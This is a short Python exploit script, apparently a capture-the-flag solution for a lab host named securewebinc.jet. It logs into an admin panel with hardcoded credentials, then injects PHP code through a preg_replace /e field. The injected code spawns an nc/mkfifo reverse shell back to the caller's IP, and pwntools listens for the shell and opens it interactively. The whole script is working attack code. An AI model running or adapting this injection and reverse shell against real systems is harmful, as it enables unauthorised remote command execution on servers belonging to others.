# Program to get Command flag

import requests
from pwn import *

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <tu ip>\n")
    exit(1)

def cmd():
    url = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/"
    sess = requests.Session()
    cred = { "username": "admin", "password": "Hackthesystem200" }
    data = { "swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {sys.argv[1]} 9090 >/tmp/f')", "to": "ss@gmail.com", "subject": "ss", "message": "fuck", "_wysihtml5_mode": 1 }
    sess.post(url + '/dologin.php', data=cred, verify=False)
    sess.post(url + '/email.php', data=data, verify=False)

threading.Thread(target=cmd, args=()).start()
shell = listen(9090, timeout=60).wait_for_connection()
shell.sendline(b"export HOME=/var/www TERM=xterm")
shell.interactive()
